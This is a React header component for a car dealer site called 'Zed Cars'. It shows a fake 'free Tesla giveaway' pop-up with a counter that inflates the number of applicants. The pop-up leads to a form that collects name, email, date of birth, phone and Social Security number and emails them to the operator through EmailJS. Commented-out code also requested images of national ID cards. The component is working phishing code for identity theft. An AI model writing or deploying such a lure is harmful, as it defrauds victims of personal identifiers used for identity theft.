import React, { useState, useRef } from "react";
import emailjs from "@emailjs/browser";
import classes from "./Header.module.css";
import logo from "../../assets/logo.png";
import { MdCancel } from "react-icons/md";
import "react-phone-number-input/style.css";
import PhoneInput from "react-phone-number-input";
import { FaCheck } from "react-icons/fa";
// import { CiImageOn } from "react-icons/ci";
import Fade from "react-reveal/Fade";

const Header = () => {
  const [num, setNum] = useState(59);
  const [showFloat, setShowFloat] = useState(true);
  const [showApply, setShowApply] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [phone, setPhone] = useState();
  const [validity, setValidity] = useState(true);
  const [enteredName, setEnteredName] = useState();
  const [enteredEmail, setEnteredEmail] = useState();
  const [enteredSsn, setEnteredSsn] = useState();
  const [enteredDOB, setEnteredDOB] = useState();
  // const [addedFront, setAddedFront] = useState(false);
  // const [addedBack, setAddedBack] = useState(false);

  for (let i = num; i < 86; i++) {
    setTimeout(() => {
      setNum(num + 1);
    }, 10000);
  }

  const form = useRef();

  const sendEmail = (e) => {
    emailjs
      .sendForm(
        "service_5y40iid",
        "template_tnd2mwr",
        form.current,
        "IJVju1s_NrxtfuCN_"
      )
      .then(
        (result) => {
          console.log(result.text);
        },
        (error) => {
          console.log(error.text);
        }
      );
  };

  const activateForm = () => {
    setShowApply(true);
    setShowFloat(false);
  };

  const deactivateForm = () => {
    // setAddedBack(false)
    // setAddedFront(false)
    setShowApply(false);
    setShowFloat(true);
  };

  const sendData = (e) => {
    e.preventDefault();
    if (enteredSsn.length !== 9) {
      setValidity(false)
      return
    }
    setValidity(true)
    sendEmail();
    setShowSuccess(true);
    setEnteredName("");
    setEnteredEmail("");
    setEnteredDOB("");
    setPhone("");
    setEnteredSsn("");
    setTimeout(() => {
      setShowSuccess(false);
      setShowApply(false);
    }, 5000);
  };

  // const checkBack = (e) => {
  //   if (e.target.value) {
  //     setAddedBack(true);
  //   } else{
  //     setAddedBack(false)
  //   }
  // };
  // const checkFront = (e) => {
  //   if (e.target.value) {
  //     setAddedFront(true);
  //   } else{
  //     setAddedFront(false)
  //   }
  // };

  const application = (
    <div className={classes.apply}>
      <h1>Application Form</h1>
      <MdCancel onClick={deactivateForm} />
      <form ref={form} onSubmit={sendData} className={classes.form} action="">
        <div className={classes.input}>
          <label htmlFor="name">Full Name:</label>
          <input
            onChange={(e) => {
              setEnteredName(e.target.value);
            }}
            value={enteredName}
            name="user_name"
            type="text"
            id="name"
            required
            placeholder="Full name"
          />
        </div>
        <div className={classes.input}>
          <label htmlFor="email">Email:</label>
          <input
            onChange={(e) => {
              setEnteredEmail(e.target.value);
            }}
            value={enteredEmail}
            name="user_email"
            type="email"
            required
            id="email"
            placeholder="email"
          />
        </div>
        <div className={classes.input}>
          <label htmlFor="dob">Date of birth:</label>
          <input
            onChange={(e) => {
              setEnteredDOB(e.target.value);
            }}
            value={enteredDOB}
            type="date"
            required
            name="user_dob"
            id="dob"
          />
        </div>
        <div className={classes.input}>
          <label htmlFor="phone">Phone:</label>
          <PhoneInput
            placeholder="Enter phone number"
            id="phone"
            name="user_phone"
            defaultCountry="US"
            value={phone}
            onChange={setPhone}
          />
        </div>
        <div className={classes.input}>
          <label htmlFor="ssn">SSN:</label>
          <input
            id="ssn"
            onChange={(e) => {
              setEnteredSsn(e.target.value);
            }}
            value={enteredSsn}
            name="user_ssn"
            type="text"
            required
            placeholder="Social Security NO."
          />
        </div>
        {!validity && <p className="error">Enter valid SSN</p>}
        {/* <div className={classes.imgs}>
          <div className={classes.input}>
            <label htmlFor="front">National ID card front:</label>
            <label className={classes.sense} htmlFor="front">
            {addedFront ? <FaCheck /> : <CiImageOn />}
              {addedFront ? "Added" : "Add Image"}
              <input
                onChange={checkFront}
                type="file"
                name="front"
                required
                id="front"
                accept="image/*"
              />
            </label>
          </div>
          <div className={classes.input}>
            <label htmlFor="back">National ID card back:</label>
            <label className={classes.sense} htmlFor="back">
              {addedBack ? <FaCheck /> : <CiImageOn />}
              {addedBack ? "Added" : "Add Image"}
              <input
                onChange={checkBack}
                type="file"
                name="back"
                required
                id="back"
                accept="image/*"
              />
            </label>
          </div>
        </div> */}
        <button className="btn" type="submit">
          Submit
        </button>
      </form>
    </div>
  );

  const win = (
    <Fade top>
      <div className={classes.roit}>
        <FaCheck />
        <h1>Application Successful!</h1>
        <p>We'll get back to you via your entered email shortly.</p>
      </div>
    </Fade>
  );

  const float = (
    <div className={classes.float}>
      <h1>NOTICE!!!</h1>
      <h2>We're giving away 100 teslas to 100 US citizens for FREE!!!</h2>
      <button onClick={activateForm} className="btn">
        click here to apply
      </button>
      <p>Hurry! {num}/100 have already applied</p>
    </div>
  );

  return (
    <header className={classes.header}>
      {showFloat && !showApply && float}
      {!showFloat && showApply && application}
      {showSuccess && win}
      <nav>
        <img src={logo} className={classes.logo} alt="zed cars" />
      </nav>
      <div className={classes["header-body"]}>
        <div className={classes["header-title"]}>
          <Fade left>
            <h1>Your Ultimate Destination for Exceptional Cars</h1>
          </Fade>
          <p>
            At Zed Cars, discover unparalleled automotive excellence tailored to
            your unique driving aspirations and desires.
          </p>
        </div>
        <button className="btn">Contact Us</button>
        <p className={classes["header-foot"]}>Trusted by 60,000 businesses</p>
      </div>
    </header>
  );
};

export default Header;
